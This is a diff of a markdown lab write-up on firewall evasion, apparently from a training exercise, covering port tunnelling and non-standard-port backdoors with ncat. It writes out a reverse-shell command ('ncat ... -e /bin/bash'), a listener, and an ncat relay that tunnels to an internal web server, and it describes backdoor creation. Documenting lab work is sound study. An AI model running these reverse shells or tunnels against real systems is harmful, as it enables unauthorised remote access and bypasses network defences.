@@ -514,70 +514,63 @@ Based on the traffic, I can see that the server's firewall is allowing port 21 o
 
 <details>
 <summary><h3>Evasion Using Port Tunnelling<h3></summary>
-#### Evasion Using Port Tunnelling:
 
+Port tunneling involves wrapping data from one protocol within another protocol. This can be used to send traffic over a network that might otherwise block or filter the original protocol.
 
-Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system.
-
-
-Port Tunneling Using Ncat:
+The diagram below is an example:
 
 ![Pasted image 20240924211930](https://github.com/user-attachments/assets/b0c7257e-5a3b-4578-89b0-cac9c37b705f)
 
-### Creating a ncat listening on port 21 on the client:
+### Getting started
 
+I began by using ncat to create listening port 21 on the client:
+
+```
 ncat -lvnp 21
+```
 
 ![Pasted image 20240924153722](https://github.com/user-attachments/assets/0a86dada-cfa9-4f16-8e46-4fef33e8a5e7)
 
+Next, I tried accessing the web server and passing the Netcat command to spawn a reverse shell:
 
-### Accessing the webserver and passing the Netcat command to spawn a reverse shell:
-
-
+```
 ncat 10.10.25.138  21 -e /bin/bash
+```
 
 ![Pasted image 20240924160925](https://github.com/user-attachments/assets/3ae5affe-ea8f-435c-a0a1-ca5806c718c1)
 
-
-Listing available services / ports that are opened:
+After, I was able to list and view available services/ports that are opened:
 
 ![Pasted image 20240924160848](https://github.com/user-attachments/assets/3dbd9dc5-ac4a-488a-9ccf-f5efdd619848)
 
-
-The client can't reach the server over the network on port 80 or 8008.
-
+Looking at Wireshark, the client can't reach the server over the network on port 80 or 8008.
 
 ![Pasted image 20240924163354](https://github.com/user-attachments/assets/de869533-6b2f-47bf-a04d-5cd4c9cdd962)
 
-Since I'm connected to the server via a reverse shell, I can open the local webserver running on port 80
+Since I'm connected to the server via a reverse shell, I can open the local webserver running on port 80:
 
+```
 ncat -lvnp 8008 -c "ncat 10.10.90.19 80"
-
+```
 
 ![Pasted image 20240924163735](https://github.com/user-attachments/assets/be94001b-b074-49f1-9359-c598cf6e7f4b)
 
-
-Now I'm able to reach the server on port 8008 , I can se some 200 codes coming from the web App:
+Now I'm able to reach the server on port 8008 , I can se some 200 codes coming from the web app:
 
 ![Pasted image 20240924163942](https://github.com/user-attachments/assets/ecb4a1ec-ea2f-47af-aee7-419875cccee0)
 
-
+Details on the 200 OK code:
 
 ![Pasted image 20240924164127](https://github.com/user-attachments/assets/05f29650-4685-4631-aba3-9e379795630d)
 
-
-Connection state at the Web-Server show the port are bind:
-
+The connection state at the web server indicates that the ports are bound.
 
 ![Pasted image 20240924164556](https://github.com/user-attachments/assets/a34ec769-abaa-4668-b082-276333c3b4bb)
-
 
 </details>
 
 <details>
 <summary><h3>Evasion via using a non-standard port<h3></summary>
-
-### Evasion Using Non-Standard Ports:
 
 Creating a backdoor via the specified port number that lets you interact with the Bash shell.
 
@@ -587,7 +580,7 @@ Creating a backdoor via the specified port number that lets you interact with th
 
 Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root, or using sudo, we cannot use port numbers below 1024.
 
-\
+
 ### Mitigations:
 
 Next-Generation Firewall (NGFW:
